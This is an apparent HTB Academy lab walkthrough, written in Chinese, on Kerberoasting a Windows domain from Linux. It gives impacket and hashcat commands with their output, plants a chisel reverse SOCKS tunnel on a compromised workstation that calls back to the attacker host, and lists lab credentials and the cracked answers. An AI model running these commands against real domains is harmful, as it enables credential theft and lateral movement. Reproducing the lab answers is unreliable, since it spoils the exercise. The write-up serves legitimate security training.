# Kerberoasting from Linux

Kerberoasting：鎖定「有 `servicePrincipalName` 的服務帳號」。任何已認證的網域使用者都能向 KDC 要該服務的 **TGS-REP**，票券中有一段是用該服務帳號的 NTLM hash 加密 → 離線爆破 → 拿到服務帳號明文密碼。工具 `GetUserSPNs.py`（impacket）/ Rubeus。

---

## 0. 目標與帳號

| 項目 | 值 |
|---|---|
| 目標 | `10.129.57.203`（ACADEMY-KERBATTCK-2-DC01，主機名 `DC01`，**本身就是 DC**） |
| 網域 | `INLANEFREIGHT.LOCAL` |
| 帳號 | `htb-student` / `HTB_@cademy_stdnt!` |

**本題答案（先給結論）：**
- **q1 Adam 的密碼（Kerberoastable 帳號 `adam.jones`，SPN `IIS_dev/inlanefreight.local:80`）→ `spongebob`**

---

## 1. 偵察：確認目標是 DC、帳號可認證

```bash
ping -c1 -W2 10.129.57.203                     # up
nxc smb 10.129.57.203 -u htb-student -p 'HTB_@cademy_stdnt!'
```
```
SMB  10.129.57.203  445  DC01  (name:DC01) ... (signing:True) (DC:True)
SMB  10.129.57.203  445  DC01  [+] INLANEFREIGHT.LOCAL\htb-student:HTB_@cademy_stdnt!
```
`(DC:True)` → 這台就是網域控制站（KDC）。**和上一個 lab 不同：這次 target 直接就是 DC，88 port 直達，不用跳板。** 從 Linux 直接打即可。

---

## 2. 列出所有 Kerberoastable 帳號（有 SPN 的）

```bash
GetUserSPNs.py INLANEFREIGHT.LOCAL/htb-student:'HTB_@cademy_stdnt!' -dc-ip 10.129.57.203
```
```
ServicePrincipalName                     Name           Delegation
CIFS/fake.inlanefreight.local            callum.dixon   unconstrained
HTTP/DC01                                 beth.richards  constrained
MSSQL_svc_dev/inlanefreight.local:1433    sqldev
MSSQLSvc/SQL01:1433                        sqlprod
MSSQL_svc_qa/inlanefreight.local:1433     sqlqa
MSSQL_svc_test/inlanefreight.local:1433   sql-test
IIS_dev/inlanefreight.local:80            adam.jones
SVC/FILER02.inlanefreight.local           jacob.kelly
```
Adam = **`adam.jones`**（SPN `IIS_dev/inlanefreight.local:80`）。

> 補充：`callum.dixon`（unconstrained）、`beth.richards`（constrained）的 `Delegation` 欄位標示它們還額外設了委派，之後可做 delegation 攻擊。本題只要 Adam。

---

## 3. 要 adam.jones 的 TGS 票（拿 hash）

```bash
GetUserSPNs.py INLANEFREIGHT.LOCAL/htb-student:'HTB_@cademy_stdnt!' -dc-ip 10.129.57.203 \
    -request-user adam.jones -outputfile adam.hash
```
拿到 `$krb5tgs$23$*adam.jones$INLANEFREIGHT.LOCAL$...`。
> 結尾 `[-] CCache file is not found. Skipping...` 只是說沒有既有票券快取，不是錯誤。

---

## 4. 離線爆破（hashcat mode 13100）

```bash
hashcat -m 13100 -a 0 adam.hash /usr/share/wordlists/rockyou.txt -O
```
```
$krb5tgs$23$*adam.jones$...:spongebob
```

> **q1 答案：`spongebob`**

`john` 等效：`john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt adam.hash`

---

## 5. 常見卡關點 / 除錯

1. **搞不清 target 是不是 DC**：先 `nxc smb <ip>` 看 `(DC:True)` 和有沒有 88/389 port。是 DC 就直打；若 target 只是工作站、DC 在內網（像另一個 lab），得先做跳板（見附錄）。
2. **`-dc-ip` 要指到真正的 KDC**：Kerberoasting 跟 DC 的 88 port 要票。指錯 IP 會逾時 —— 先 `ip route get <ip>` 確認可達。
3. **列舉不帶 `-request` 不會產生 hash**：`GetUserSPNs.py` 不加 `-request`/`-request-user` 只列清單；要爆破要加 `-request-user <name>` 或 `-request`（全部）。
4. **hash 模式別搞混**：Kerberoast 的 TGS-REP 是 `-m 13100`；AS-REProast 的 AS-REP 是 `-m 18200`。

---

## 附錄：target 是工作站、DC 在內網時（跳板版 Kerberoasting）

> 另一個 lab：target `10.129.57.196`（WS01）只是工作站，DC01 在內網 `172.16.99.3`，VPN 到不了。做法是把雙網卡的 WS01 當跳板。

```bash
# 1. 先確認 target 不是 DC、問出 DC 位置
nxc smb 10.129.57.196 -u htb-student -p 'HTB_@cademy_stdnt!'            # Pwn3d! 但非 DC
nxc smb 10.129.57.196 -u htb-student -p 'HTB_@cademy_stdnt!' \
    -x "nltest /dsgetdc:INLANEFREIGHT.LOCAL"                           # DC: 172.16.99.3（內網）

# 2. 直接打 DC 會逾時（沒路由）—— 這就是卡關主因，不是指令錯
ip route get 172.16.99.3                                               # via tun0，無 172.16 路由

# 3. 上傳 Windows chisel 到 WS01（nxc --put-file 偶發 reset，改 smbclient）
curl -sL -o c.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz
gunzip c.gz && mv c chisel.exe
smbclient //10.129.57.196/C$ -U 'INLANEFREIGHT.LOCAL\htb-student%HTB_@cademy_stdnt!' \
    -c 'cd \Windows\Temp\; put chisel.exe c.exe'

# 4. 攻擊機起反向 server；WS01 連回開反向 SOCKS
chisel server --reverse -p 8008        # 攻擊機（背景跑，別自己再 nohup & 包一層）
nxc smb 10.129.57.196 -u htb-student -p 'HTB_@cademy_stdnt!' \
    -x 'start /b "" C:\Windows\Temp\c.exe client 10.10.14.142:8008 R:1080:socks'

# 5. proxychains 走 socks5 127.0.0.1:1080，隔跳板打 DC
cat > pc.conf <<'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
EOF
proxychains4 -f pc.conf GetUserSPNs.py INLANEFREIGHT.LOCAL/htb-student:'HTB_@cademy_stdnt!' \
    -dc-ip 172.16.99.3 -request-user jacob.kelly -outputfile jacob.hash
hashcat -m 13100 -a 0 jacob.hash /usr/share/wordlists/rockyou.txt -O   # -> tinkerbell
```
跳板版重點：target 是工作站、DC 在內網 → 用被攻陷主機（雙網卡）架 chisel 反向 SOCKS，再用 proxychains 讓 impacket 轉進內網打 KDC。

### 附錄清理
```bash
nxc smb 10.129.57.196 -u htb-student -p 'HTB_@cademy_stdnt!' -x 'taskkill /F /IM c.exe'
smbclient //10.129.57.196/C$ -U 'INLANEFREIGHT.LOCAL\htb-student%HTB_@cademy_stdnt!' -c 'cd \Windows\Temp\; del c.exe'
pkill -f 'chisel server'
```

---

## 附：AS-REProasting 對照

```bash
GetNPUsers.py INLANEFREIGHT.LOCAL/htb-student:'HTB_@cademy_stdnt!' -dc-ip 10.129.57.203 \
    -request -format hashcat -outputfile asrep.hash
hashcat -m 18200 -a 0 asrep.hash /usr/share/wordlists/rockyou.txt
```
差別：Kerberoast 爆服務帳號密碼（`-m 13100`，TGS-REP，需先認證）；AS-REProast 爆設錯預認證（`DONT_REQ_PREAUTH`）的一般帳號密碼（`-m 18200`，AS-REP，可不認證）。
